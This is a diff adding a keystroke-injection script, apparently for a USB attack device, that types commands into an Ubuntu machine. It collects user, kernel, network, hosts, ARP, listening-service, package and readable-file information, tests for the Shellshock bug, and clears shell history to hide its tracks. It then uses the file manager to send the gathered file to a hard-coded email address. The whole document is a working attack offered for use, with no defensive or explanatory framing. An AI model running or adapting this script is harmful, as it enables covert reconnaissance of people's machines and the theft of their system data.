@@ -1,0 +1,157 @@
+#Info gathering Ubuntu 1.0 Script issues OS info gathering commands in terminal - by Captain_Harlock, Improved by Thecakeisgit ;D
+#Converted by Skazza
+DELAY(81) 3000
+PRESS_KEYS(81) CTRL+ALT+t
+DELAY(81) 1500
+WRITE(81) "clear"
+DELAY(81) 10
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Logged in user: " $USER > info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo -n "Distribution Kernel Version: " >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "cat /etc/issue | cut -c1-13 >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo -n "uname results: " >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "uname -a >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 100
+WRITE(81) "echo >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Shellsock Bug Vulnerability: " >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "env x='() { :;}; echo vulnerable' bash -c "echo this is a test" >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Mounted filesystems: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "mount -l >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 100
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50 
+WRITE(81) "echo "Network Configuration: " >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "ifconfig -a | grep 'Link\|inet' >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Print Hosts: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "cat /etc/hosts >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Print ARP: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50 
+WRITE(81) "arp >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50 
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Development tools availability: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "which gcc >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "which g++ >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "which python >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Print TCP/UDP Listening Services: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "netstat -tunlpe >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 300
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Installed Packages: " >> info_gathering.txt"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 200
+WRITE(81) "dpkg -l >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 300
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "echo "Find Readable Folders in /etc: " >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 500
+WRITE(81) "echo >> info_gathering.txt"
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "history -c"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 50
+WRITE(81) "nautilus"
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 2000
+WRITE(81) "info_"
+DELAY(81) 50
+PRESS_KEYS(81) ESC
+DELAY(81) 50
+PRESS_KEYS(81) CONTEXTUAL
+DELAY(81) 50
+PRESS_KEYS(81) ARRWUP
+DELAY(81) 50
+PRESS_KEYS(81) ARRWUP
+DELAY(81) 50
+PRESS_KEYS(81) ARRWUP
+DELAY(81) 50
+PRESS_KEYS(81) ARRWUP
+DELAY(81) 50
+PRESS_KEYS(81) ENTER
+DELAY(81) 2000
+WRITE(81) "fra.delussu@libero.it"
+DELAY(81) 50
+PRESS_KEYS(81) CTRL+ENTER
